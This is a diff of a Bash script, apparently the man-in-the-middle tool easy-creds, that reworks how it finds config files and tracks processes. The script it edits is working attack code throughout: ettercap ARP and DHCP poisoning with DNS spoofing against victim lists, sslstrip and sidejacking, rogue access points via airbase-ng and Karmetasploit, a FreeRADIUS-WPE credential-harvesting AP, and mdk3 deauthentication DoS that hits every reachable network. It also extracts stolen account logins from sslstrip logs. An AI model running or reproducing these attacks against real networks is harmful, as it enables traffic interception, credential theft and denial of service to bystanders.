@@ -48,7 +48,6 @@ trap f_Quit 2
 #
 ##################################################
 f_isxrunning(){
-
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
 	isxrunning=
@@ -57,10 +56,10 @@ else
 fi
 
 # Uncomment the following line to launch attacks in a screen session instead of an xterm window.
-unset isxrunning
+#unset isxrunning
 
 if [ -z ${isxrunning} ]; then
-	echo -e "\n\e[1;31m[-] X Windows not detected, your attack will be launched in screen\e[0m\n"
+	echo -e "\n\e[1;31m[-] Your attack will be launched in screen\e[0m\n"
 	sleep 2
 fi
 }
@@ -85,20 +84,23 @@ f_checkexit(){
 ##################################################
 f_Quit(){
 	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
-	sleep 1
 
-	if [ ! -z $(pidof sslstrip) ]; then kill $(pidof sslstrip); fi
+	# The following will run regardless of attack selected
+	if [ -s /tmp/ec/tail.pid ]; then kill $(cat /tmp/ec/tail.pid); fi
+	if [ -s /tmp/ec/sslstrip.pid ]; then kill $(cat /tmp/ec/sslstrip.pid); fi
 	if [ ! -z $(pidof hamster) ]; then kill $(pidof hamster); fi
 	if [ ! -z $(pidof ferret) ]; then kill $(pidof ferret); fi
 	if [ ! -z $(pidof ettercap) ]; then kill $(pidof ettercap); fi
 	if [ ! -z $(pidof urlsnarf) ]; then kill $(pidof urlsnarf); fi
 	if [ ! -z $(pidof dsniff) ]; then kill $(pidof dsniff); fi
+	echo "0" > /proc/sys/net/ipv4/ip_forward
 
+	# The following will run for wireless AP attacks
 	if [ ! -z ${wireless} ]; then
-	 kill $(pidof airbase-ng) $(pidof hamster) $(pidof ferret)  $(cat /tmp/ec/tail.pid)
-	 if [ -e /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
-	 if [ -e /var/run/dhcpd.pid ]; then kill $(cat /var/run/dhcpd.pid); fi
-	 if [ -e /var/run/dhcp3-server/dhcpd.pid ]; then kill $(cat /var/run/dhcp3-server/dhcpd.pid); fi
+	 kill $(pidof airbase-ng)
+	 if [ -s /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
+	 if [ -s /var/run/dhcpd.pid ]; then kill $(cat /var/run/dhcpd.pid); fi
+	 if [ -s /var/run/dhcp3-server/dhcpd.pid ]; then kill $(cat /var/run/dhcp3-server/dhcpd.pid); fi
 	 iptables --flush
 	 iptables --table nat --flush
 	 iptables --delete-chain
@@ -106,29 +108,27 @@ f_Quit(){
 	 airmon-ng stop ${MONMODE} &> /dev/null
 	fi
 
-	echo "0" > /proc/sys/net/ipv4/ip_forward
-
+	# The following will run for wireless AP DoS attacks
 	if [ ! -z ${dosattack} ] ; then
 	  airmon-ng stop ${dosmon} &> /dev/null
 	  airmon-ng stop ${airomon} &> /dev/null
 	fi
 
+	# The following will run for the Karmetasploit attack
 	if [ ! -z ${karmasploit} ] ; then
 	 kill $(cat /tmp/ec/ec-karma-pid) &> /dev/null
 	 kill $(cat /tmp/ec/ec-metasploit-pid) &> /dev/null
 	fi
 
+	# The following will run for wireless Free Radius attacks
 	if [ ! -z ${fra} ]; then
 	 kill $(pidof radiusd) &> /dev/null
 	 kill $(pidof hostapd) &> /dev/null
-	 kill $(cat /tmp/ec/tail.pid) &> /dev/null
 	 kill $(cat /tmp/ec/tshark.pid) &> /dev/null
-	 kill $(pidof tail) &> /dev/null
-	 mv ${pathtoradiusconf}/radiusd.conf.back ${pathtoradiusconf}/radiusd.conf
-	 mv ${pathtoradiusconf}/clients.conf.back ${pathtoradiusconf}/clients.conf
 	 echo "" > ${freeradiuslog}
 	fi
 
+	# Final portion to clean up and quit current attack or exit
 	if [ "${mainchoice}" == "5" ]; then
 	 clear
 	 rm -rf /tmp/ec
@@ -146,50 +146,73 @@ f_Quit(){
 #
 ##################################################
 f_addtunnel(){
-	if [ -z ${isxrunning} ];then
-		if [ -e /etc/default/isc-dhcp-server ]; then
-			nano /etc/default/isc-dhcp-server
-		elif [ -e /etc/sysconfig/dhcpd ]; then
-			nano /etc/sysconfig/dhcpd
-		else
-			nano /etc/default/dhcp3-server
-		fi
+	#Check differnet paths based on install
+	if [ -e /etc/default/isc-dhcp-server ]; then
+		dhcp_tunnel_add=/etc/default/isc-dhcp-server
+	elif [ -e /etc/sysconfig/dhcpd ]; then
+		dhcp_tunnel_add=/etc/sysconfig/dhcpd
+	elif [ -e /etc/default/dhcp3-server ]; then
+		dhcp_tunnel_add=/etc/default/dhcp3-server
 	else
-		if [ -e /etc/default/isc-dhcp-server ]; then
-	 		xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/default/isc-dhcp-server &
-		elif [ -e /etc/sysconfig/dhcpd ]; then
-			xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/sysconfig/dhcpd &
-		else
-	 		xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/default/dhcp3-server &
-		fi
+		echo -e "\e[1;31m[-] I can't find the proper file. Ensure a dhcp server is installed.\e[0m"
+		sleep 3
+		f_prereqs
+	fi
 
+	if [ -z ${isxrunning} ];then
+		nano ${dhcp_tunnel_add}
+	else
+	 	xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano ${dhcp_tunnel_add} &
 	fi
 	f_prereqs
 }
 ##################################################
 f_nanoetter(){
-	if [ -z ${isxrunning} ];then
-	 nano /etc/etter.conf
+	#ettercap source install
+	if [ -e /etc/ettercap/etter.conf ]; then
+		etter_conf_path=/etc/ettercap/etter.conf
+	#ettercap repo package install
+	elif [ -e /etc/etter.conf ];then
+		etter_conf_path=/etc/etter.conf
 	else
-	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano /etc/etter.conf &
+		echo -e "\e[1;31m[-] I can't find the etter.conf file\e[0m"
+		sleep 3
+		f_prereqs
+	fi
+
+	if [ -z ${isxrunning} ];then
+	 nano ${etter_conf_path}
+	else
+	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano ${etter_conf_path} &
 	fi
 	f_prereqs
 }
 ##################################################
 f_nanoetterdns(){
-	if [ -z ${isxrunning} ];then
-	 nano /usr/local/share/ettercap/etter.dns
+	#ettercap source install
+	if [ -e /usr/local/share/ettercap/etter.dns ]; then
+		etter_dns_path=/usr/local/share/ettercap/etter.dns
+	#ettercap repo package install
+	elif [ -e /usr/share/ettercap/etter.dns ];then
+		etter_dns_path=/usr/share/ettercap/etter.dns
 	else
-	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano /usr/local/share/ettercap/etter.dns &
+		echo -e "\e[1;31m[-] I can't find the etter.dns file\e[0m"
+		sleep 3
+		f_prereqs
+	fi
+
+	if [ -z ${isxrunning} ];then
+	 nano ${etter_dns_path}
+	else
+	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano ${etter_dns_path} &
 	fi
 	f_prereqs
 }
 ##################################################
-f_dhcp3install(){
+f_dhcp_server_install(){
 	clear
 	f_Banner
-
-	echo -e "\e[1;33m[*] Installing dhcp-server, please stand by.\e[0m\n"
+	echo -e "\e[1;33m[*] Installing dhcp server, please stand by.\e[0m\n"
 	if [ -e /etc/lsb-release ] || [ -e /etc/issue ]; then
 	 which_dhcp_server=$(apt-cache search isc-dhcp-server)
 	  if [ -z "${which_dhcp_server}" ]; then
@@ -210,7 +233,6 @@ f_dhcp3install(){
 f_karmareqs(){
 	clear
 	f_Banner
-
 	echo -e "\e[1;33m[*] Installing Karmetasploit Prerequisites, please standby.\e[0m\n"
 	gem install activerecord
 	echo -e "\n\e[1;32m [+] Finished installing Karmetasploit Prerequisites.\e[0m\n"
@@ -221,7 +243,6 @@ f_karmareqs(){
 f_msfupdate(){
 	clear
 	f_Banner
-
 	echo -e "\e[1;33m[*] Updating the Metasploit Framework, please stand by.\e[0m\n"
 	msfupdate
 	echo -e "\n\e[1;32m [+] Finished updating the Metasploit Framework.\e[0m\n"
@@ -232,7 +253,6 @@ f_msfupdate(){
 f_aircrackupdate(){
 	clear
 	f_Banner
-
 	echo -e "\n\e[1;33m[*] Updating aircrack-ng from SVN, please be patient...\e[0m"
 	svn co http://trac.aircrack-ng.org/svn/trunk/ /tmp/ec/aircrack-ng
 	cd /tmp/ec/aircrack-ng/
@@ -264,7 +284,6 @@ f_pbs(){
 ##################################################
 f_getvics(){
 	read -p "Do you have a populated file of victims to use? [y/N]: " VICFILE
-
 	if [ "$(echo ${VICFILE} | tr 'A-Z' 'a-z')" == "y" ]; then
 		VICLIST=
 		p=
@@ -287,7 +306,6 @@ f_getvics(){
 }
 ##################################################
 f_whichettercap(){
-
 	if [ "${VICFILE}" == "y" ]; then
 	 case ${poisoningchoice} in
 	   2) etterlaunch=1 ;;
@@ -304,15 +322,15 @@ f_whichettercap(){
 }
 ##################################################
 f_HostScan(){
+	# ARP scan of segment with nmap and creates victim file in /tmp
 	clear
 	f_Banner
-
 	range=
 	while [ -z "${range}" ]; do read -p "Enter your target network range (nmap format): " range; done
 
 	echo -e "Performing an ARP scan to identify live devices - excluding our IPs.\n\nThis may take a bit.\n"
 
-	#take our addresses out of the mix  ;)
+	#take our addresses out of the mix
 	myaddrs=$(printf "%s," $(ifconfig | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}' | sed 's/addr://g'))
 
 	nmap -PR -n -sn ${range} --exclude ${myaddrs} -oN /tmp/ec/nmap.scan
@@ -422,40 +440,48 @@ f_sidejack(){
 	screen -S SideJack -X screen -t Hamster hamster
 	cd ${location}
 	sleep 2
-	echo -e "\n\e[1;33m[*] Run firefox and type http://hamster\e[0m\n"
+	echo -e "\n\e[1;33m[*] Run browser and type http://hamster\e[0m\n"
 	echo -e "\e[1;33m[*] Don't forget to set the proxy to 127.0.0.1:1234\e[0m"
 	sleep 5
 }
 ##################################################
 f_ecap(){
+	etter_conf_path=
+	#ettercap source install
+	if [ -e /etc/ettercap/etter.conf ]; then
+	etter_conf_path=/etc/ettercap/etter.conf
+	#ettercap repo package install
+	elif [ -e /etc/etter.conf ];then
+	etter_conf_path=/etc/etter.conf
+	fi
+
 	echo -e "\n\e[1;33m[*] Launching ettercap, poisoning specified hosts.\e[0m"
 	y=$(($y+$yoffset))
-
 	case ${etterlaunch} in
 	1) type="[arp:remote]"
-	   c="ettercap -a /etc/etter.conf -M arp:remote -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
 	2) type="[arp:remote]"
-	   c="ettercap -a /etc/etter.conf -M arp:remote -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
 	3) type="[arp:oneway]"
-	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} // /${GW}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} // /${GW}/" ;;
 	4) type="[arp:oneway]"
-	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${VICS}/ /${GW}/" ;;
+	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${VICS}/ /${GW}/" ;;
 	5) type="[dhcp:${POOL}/${MASK}/${DNS}/]"
-	   c="ettercap -a /etc/etter.conf -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M dhcp:${POOL}/${MASK}/${DNS}/" ;;
+	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M dhcp:${POOL}/${MASK}/${DNS}/" ;;
 	6) type="[icmp:${GATEMAC}/${GATEIP}]"
-	   c="ettercap -a /etc/etter.conf -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M icmp:${GATEMAC}/${GATEIP}" ;;
+	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M icmp:${GATEMAC}/${GATEIP}" ;;
 	7) type="[tunnel]"
-	   c="ettercap -a /etc/etter.conf -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} // //" ;;
+	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} // //" ;;
 	8) type="[dns_spoof / arp]"
-	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
+	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
 	9) type="[dns_spoof / arp]"
-	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
+	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
 	esac
 
 	if [ ! -z ${isxrunning} ]; then
 	   xterm -geometry "${width}"x${height}-${x}+${y} -T "Ettercap - $type" -l -lf ${logfldr}/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ${c} &
 	else
-	   screen -S easy-creds -X screen -t ettercap ${c}
+	   screen -S easy-creds -X screen -t "Ettercap-$type" ${c}
 	fi
 	ecpid=$(pidof ettercap)
 }
@@ -467,8 +493,6 @@ f_ecap(){
 f_fakeapAttack(){
 	wireless=1
 	offset=1
-
-	# Credit to Lucafa's post on the Offensive-Security forums, used as a base
 	clear
 	f_Banner
 	f_xtermwindows
@@ -527,7 +551,6 @@ f_fakeapAttack(){
 }
 ##################################################
 f_dhcpconf(){
-
 	dhcpdconf=
 	if [ -e /etc/dhcp3/dhcpd.conf ]; then #Ubuntu/Debian dhcp3-server
 		dhcpdconf="/etc/dhcp3/dhcpd.conf"
@@ -558,11 +581,9 @@ f_dhcpconf(){
 	ATIP=$(cat ${DHCPPATH} |grep -i "option routers"|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
 	ATSUB=$(cat ${DHCPPATH} |grep -i subnet|cut -d" " -f4)
 	ATCIDR=$(ipcalc -b ${ATNET}/${ATSUB}|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\/[0-9]\{1,2\}')
-
 }
 ##################################################
 f_ipcalc(){
-
 	dhcpdconf=
 	if [ -e /etc/dhcp3/dhcpd.conf ]; then
 		dhcpdconf="/etc/dhcp3/dhcpd.conf"
@@ -617,7 +638,6 @@ f_dhcpmanual(){
 ##################################################
 f_dhcptunnel(){
 	etterlaunch=7
-
 	# airbase-ng is going to create our fake AP with the SSID we specified
 	echo -e "\n\e[1;33m[*] Launching Airbase with your settings.\e[0m"
 
@@ -656,8 +676,8 @@ f_dhcptunnel(){
 	 y=$((${y}+${yoffset}))
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
-	echo $! > /tmp/ec/tail.pid
-	sleep 3
+	ps a|grep tail|grep -v grep|cut -d" " -f1 > /tmp/ec/tail.pid
+	sleep 2
 
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m"
 	if [ -e /etc/dhcp3/dhcpd.conf ]; then
@@ -668,13 +688,12 @@ f_dhcptunnel(){
 		service isc-dhcp-server start
 	fi
 
-	sleep 3
+	sleep 2
 	f_finalstage
 	f_mainmenu
 }
 ##################################################
 f_finalstage(){
-
 	if [ -z ${wireless} ]; then
 	   read -p "Would you like to include a sidejacking attack? [y/N]: " SIDEJACK
 	   SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"
@@ -692,28 +711,29 @@ f_finalstage(){
 			xterm -geometry "${width}"x${height}-${x}+${y} -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w ${logfldr}/${sslstripfilename} &
 		fi
 	fi
-	echo $! > /tmp/ec/sslstrip.pid
+	ps a|grep sslstrip|grep -v grep|cut -d" " -f1 > /tmp/ec/sslstrip.pid
 	sleep 2
-	
 	#Launch ettercap
 	f_ecap
 	sleep 3
-	
+
 	echo -e "\n\e[1;33m[*] Configuring IP forwarding...\e[0m"
 	echo "1" > /proc/sys/net/ipv4/ip_forward
 	sleep 3
 
 	echo -e "\n\e[1;33m[*] Launching URLSnarf...\e[0m"
 	if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
-		screen -S easy-creds -X screen -t urlsnarf urlsnarf -i $IFACE
+		screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${TUNIFACE}
 		screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
 		screen -S easy-creds -p urlsnarf -X log
 	elif [ "${wireless}" == "1" ]; then
 		y=$((${y}+${yoffset}))
 		xterm -geometry "${width}"x${height}-${x}+${y} -T "URL Snarf" -l -lf ${logfldr}/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i ${TUNIFACE} &
 		sleep 3
-	elif [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
-		screen -S easy-creds -t urlsnarf -X screen urlsnarf -i ${TUNIFACE}
+	elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
+		screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${IFACE}
+		screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
+		screen -S easy-creds -p urlsnarf -X log
 	else
 		y=$((${y}+${yoffset}))
 		xterm -geometry "${width}"x${height}-${x}+${y} -T "URL Snarf" -l -lf ${logfldr}/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i ${IFACE} &
@@ -753,7 +773,6 @@ f_mdk3aps(){
 	clear
 	f_Banner
 	dosattack=1
-
 	# grep the MACs to a temp white list
 	ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst
 	echo
@@ -790,9 +809,9 @@ f_mdk3aps(){
 		xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
 	fi
 
-	 echo $! > /tmp/dosap-pid
+	 echo ps -a|grep mdk3|grep -v grep|cut -d " " -f1 > /tmp/ec/dosap-pid
 	 sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
-	 echo $! > /tmp/ec/sleep.pid
+	 echo ps -a|grep sleep|grep -v grep|cut -d " " -f1 > /tmp/ec/sleep.pid
 	 echo -e "\n\e[1;33m[*] Attack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack...\e[0m"
 	else
 	 f_getbssids
@@ -803,7 +822,6 @@ f_lastman(){
 	clear
 	f_Banner
 	dosattack=1
-
 	echo -e "\n\e[1;33m[*] This attack will DoS every AP BSSID & Client MAC it can reach.\e[0m\n\e[1;31mUse with extreme caution\e[0m\n\n"
 
 	# grep the MACs to a temp white list
@@ -828,9 +846,9 @@ f_lastman(){
 	else
 		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${dosmon} >/dev/null) &
 	fi
-	echo $! > /tmp/ec/dosap-pid
+	echo ps -a|grep mdk3|grep -v grep|cut -d " " -f1 > /tmp/ec/dosap-pid
 	sleep 5m && kill $(cat /tmp/ec/dosap-pid) &
-	echo $! > /tmp/ec/sleep.pid
+	echo ps -a|grep sleep|grep -v grep|cut -d " " -f1 > /tmp/ec/sleep.pid
 
 	airmon-ng stop ${dosmon} >/dev/null
 
@@ -841,7 +859,6 @@ f_lastman(){
 f_getbssids(){
 	clear
 	f_Banner
-
 	echo -e "\n\e[1;33m[*] This will launch airodump-ng and allow you to specify the AP to DoS\e[0m\n"
 
 	airmon-ng | grep wlan | sed '$a\\n'
@@ -863,9 +880,9 @@ f_getbssids(){
 	else
 		xterm -geometry 90x25+0+0 -T "Airodump" -e airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv &
 	fi
-	echo $! > /tmp/ec/airodump-pid
+	echo $! > /tmp/ec/airodump.pid
 	#wait for the process to die
-	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump-pid)" | grep "$(cat /tmp/ec/airodump-pid)" | sed 's/ //g') ]; do sleep 3; done
+	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump.pid)" | grep "$(cat /tmp/ec/airodump.pid)" | sed 's/ //g') ]; do sleep 3; done
 	sleep 3
 
 	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
@@ -909,10 +926,9 @@ f_getbssids(){
 }
 ##################################################
 f_KarmaAttack(){
+	# Credit to Metasploit Unleashed, used as a base
 	wireless=1
 	karmasploit=1
-
-	# Credit to Metasploit Unleashed, used as a base
 	clear
 	f_Banner
 	f_xtermwindows
@@ -948,7 +964,6 @@ f_karmadhcp(){
 	while [ -z ${ATCIDR} ]; do read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR; done
 	ATDNS=
 	while [ -z ${ATDNS} ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS; done
-
 	f_ipcalc
 }
 ##################################################
@@ -1017,13 +1032,12 @@ f_karmasetup(){
 }
 ##################################################
 f_karmafinal(){
-
 	echo -e "\n\e[1;33m[*] Launching Airbase...\e[0m"
 	# airbase-ng is going to create our fake AP with the SSID default
 	if [ -z ${isxrunning} ]; then
-	 screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 60 -e default ${MONMODE}
+	 screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e default -v ${MONMODE}
 	else
-	 xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 60 -e "default" ${MONMODE} &
+	 xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "default" -v ${MONMODE} &
 	fi
 	echo $! > /tmp/ec/ec-karma-pid
 	sleep 7
@@ -1031,7 +1045,7 @@ f_karmafinal(){
 	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
 	ifconfig ${TUNIFACE} up
 	ifconfig ${TUNIFACE} ${ATIP} netmask ${ATSUB}
-	ifconfig ${TUNIFACE} mtu 1400
+	ifconfig ${TUNIFACE} mtu 1500
 	route add -net ${ATNET} netmask ${ATSUB} gw ${ATIP} dev ${TUNIFACE}
 	sleep 3
 
@@ -1054,16 +1068,18 @@ f_karmafinal(){
 	 y=$((${y}+${yoffset}))
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
-	echo $! > /tmp/ec/tail.pid
+	ps a|grep tail|grep -v grep|cut -d" " -f1 > /tmp/ec/tail.pid
 	sleep 3
 
 	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
-	if [ -e /etc/dhcp3/dhcpd.conf ]; then
+	if [ -e /etc/dhcp/dhcpd.conf ]; then
+		service isc-dhcp-server start
+	elif [ -e /etc/dhcp3/dhcpd.conf ]; then
 		dhcpd3 -q -cf ${DHCPPATH} -pf /var/run/dhcp3-server/dhcpd.pid ${TUNIFACE} &
 	elif [ -e /etc/sysconfig/dhcpd ]; then
 		systemctl start dhcpd.service
 	else
-		service isc-dhcp-server start
+		echo -e "\n\e[1;32m[!] Couldn't find a DHCP server to start.\e[0m\n"
 	fi
 	sleep 3
 
@@ -1089,7 +1105,6 @@ f_freeradiusattack(){
 	clear
 	f_Banner
 	fra=1
-
 	#installed by user
 	if [ -e /usr/local/var/log/radius/freeradius-server-wpe.log ] || [ -x /usr/local/sbin/radiusd ]; then
 		freeradiuslog=/usr/local/var/log/radius/freeradius-server-wpe.log
@@ -1105,7 +1120,6 @@ f_freeradiusattack(){
 	 echo -e "\n\e[1;31m[-] I could not find and Atheros wireless card.\nAttack only works with an atheros chipset...\e[0m\n"
 	 sleep 5
 	fi
-
 
 	mv ${pathtoradiusconf}/radiusd.conf ${pathtoradiusconf}/radiusd.conf.back
 	mv ${pathtoradiusconf}/clients.conf ${pathtoradiusconf}/clients.conf.back
@@ -1124,8 +1138,6 @@ f_freeradiusattack(){
 	while [ -z ${radiussecret} ]; do
 	 read -p "Please enter the shared secret you'd like to use for the radius connection: " radiussecret
 	done
-
-	echo
 
 	f_buildclientsconf
 	f_hostapd
@@ -1157,7 +1169,6 @@ f_buildclientsconf(){
 }
 ##################################################
 f_hostapd(){
-
 	airmon-ng | grep 'wlan'
 	radwiface=
 	while [ -z ${radwiface} ]; do
@@ -1199,11 +1210,11 @@ f_hostapd(){
 f_freeradiusfinal(){
 	echo -e "\n\e[1;33m[*] Launching the FreeRadius server...\e[0m\n"
 	if [ ! -z ${isxrunning} ]; then
-	 xterm -geometry "${width}"x${height}-${x}+${y} -T "radiusd" -bg white -fg black -e radiusd -X -f &
+	 xterm -geometry "${width}"x${height}-${x}+${y} -T "Radius Server" -bg white -fg black -e radiusd -X -f &
 	 echo $! > /tmp/ec/freeradius.pid
 	 sleep 3
 	else
-	 screen -dmS FreeRadius -t radiusd radiusd -X -f
+	 screen -dmS FreeRadius -t Radius-Server radiusd -X -f
 	 echo $! > /tmp/ec/freeradius.pid
 	fi
 
@@ -1215,7 +1226,7 @@ f_freeradiusfinal(){
 	 xterm -geometry "${width}"x${height}-${x}+${y} -T "hostapd" -bg black -fg white -e hostapd /tmp/ec/ec-hostapd.conf &
 	 sleep 3
 	else
-	 screen -S FreeRadius -t hostapd -X screen hostapd /tmp/ec/ec-hostapd.conf
+	 screen -S FreeRadius -X screen -t Hostapd hostapd /tmp/ec/ec-hostapd.conf
 	 echo $! > /tmp/ec/hostapd.pid
 	fi
 
@@ -1229,13 +1240,13 @@ f_freeradiusfinal(){
 	if [ ! -z ${isxrunning} ]; then
 		y=$((${y}+${yoffset}))
 		xterm -geometry "${width}"x${height}-${x}+${y} -T "credentials" -bg black -fg green -hold -l -lf ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt -e tail -f ${freeradiuslog} &
-		echo $! > /tmp/ec/tail.pid
+		ps a|grep tail|grep -v grep|cut -d" " -f1 > /tmp/ec/tail.pid
 		sleep 3
 	else
 		screen -S FreeRadius -X screen -t credentials tail -f ${freeradiuslog}
 		screen -S FreeRadius -p credentials -X logfile ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt
 		screen -S FreeRadius -p credentials -X log
-		echo $! > /tmp/ec/tail.pid
+		ps a|grep tail|grep -v grep|cut -d" " -f1 > /tmp/ec/tail.pid
 	fi
 
 	tshark -i ${radwiface} -w ${logfldr}/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
@@ -1249,7 +1260,6 @@ f_freeradiusfinal(){
 f_SSLStrip(){
 	clear
 	f_Banner
-
 	if [ -d ${logfldr} ]; then
 	  echo "SSLStrip logs in current log folder:"
 	  ls ${logfldr}/sslstrip* 2>/dev/null
@@ -1258,13 +1268,11 @@ f_SSLStrip(){
 
 	if [ -e /${PWD}/strip-accts.txt ]; then rm /${PWD}/strip-accts.txt; fi
 
-	# Coded with help from 'Crusty Old Fart' - Ubuntu Forums
 	LOGPATH=
 	while [ -z ${LOGPATH} ] || [ ! -f "${LOGPATH}" ]; do read -e -p "Enter the full path to your SSLStrip log file: " LOGPATH;	done
 	DEFS=
 	while [ -z ${DEFS} ] || [ ! -e "${DEFS}" ]; do
-		read -e -p "Enter the full path to your definitions file [/pentest/sniffers/easy-creds/definitions.sslstrip]: " DEFS
-		if [ -z ${DEFS} ]; then DEFS="/pentest/sniffers/easy-creds/definitions.sslstrip"; fi
+		read -e -p "Enter the full path to your SSLStrip definitions file: " DEFS
 	done
 
 	NUMLINES=$(cat "${DEFS}" | wc -l)
@@ -1280,15 +1288,15 @@ f_SSLStrip(){
 		if [ "${GREPSTR}" ]; then
 			echo -n "${VAL1}" "- " >> /${PWD}/strip-accts.txt
 			echo "${GREPSTR}" | \
-			sed -e 's/.*'${VAL3}'=/'${VAL3}'=/' -e 's/&/ /' -e 's/&.*//' >> /${PWD}/strip-accts.txt
+			sed -e 's/.*'${VAL3}'=/'${VAL3}'=/' -e 's/&/ /' -e 's/&.*//' >> ${PWD}/strip-accts.txt
 		fi
 		i=$[${i}+1]
 	done
 
-	if [ -s /${PWD}/strip-accts.txt ] && [ -z ${isxrunning} ]; then
-	 cat /${PWD}/strip-accts.txt | less
-	elif [ -s /${PWD}/strip-accts.txt ] && [ ! -z ${isxrunning} ]; then
-	 xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat /${PWD}/strip-accts.txt &
+	if [ -s ${PWD}/strip-accts.txt ] && [ -z ${isxrunning} ]; then
+	 cat ${PWD}/strip-accts.txt | less
